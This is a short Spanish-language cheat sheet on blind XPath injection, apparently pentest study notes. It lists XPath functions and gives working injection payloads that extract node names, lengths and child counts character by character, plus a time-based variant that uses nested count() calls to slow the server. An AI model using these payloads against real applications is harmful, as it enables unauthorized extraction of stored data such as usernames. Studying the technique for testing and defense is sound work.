### INTRO

Funciona con el mismo criterio de las BLIND SQLI.

### Funciones

| función | uso |
|---|---|
|Name() | Puede ser llamada en cualquier nodo y nos da el nombre del nodo    |
|Substring () | nos permite exfiltrar el nombre de un nodo un caracter a la vez  |
|string-length() | nos permite determinar el largo del nombre de un nodo |
|count() | Devuelve el número de hijos que tiene un nodo |

### Explotaciones

#### Extraer el length de un nodo

  invalid'+or+string-length(name(/*[1]))=1+and+'1'='1
  
#### Extraer caracteres de un nodo

  invalid'+or+substring(name(/*[1]),<index_del_nombre>,1)='a'+and+'1'='1

#### Extraer cantidad de subnodos 

Una vez que tenemos el nombre de un nodo tenemos podemos extraer la cantidad de subnodos:

  invalid'+or+count(/<nodo>/*)=2+and+'1'='1


#### Extrayendo el nombre de un subnodo:

Una vez que sabemos la cantidad de subnodos y tenemos el nodo principal podemos empezar a realizar los pasos anteriormente agregando el index del subnodo: [1]

  invalid+or+substring(name(/<nodo>/*[1]),1,1)='a'+and+'1'='1
  
---

### Time Based blind xpath

En los casos donde la respuesta no pueda darnos un indicio de funcionamiento, aunque no hay una funcion SLEEP, tenemos formas de sobrecargar el procesamiento haciendo que la respuesta se vuelva más lenta y de esta manera saber si se están procesando los datos. 

Para esto usaremos de manera recursiva la función COUNT haciendo que se itere el documento reiteradas veces.

  invalid'+or+substring(/users/user[1]/username,1,1)='a'+and+count((//.)[count((//.))])+and+'1'='1

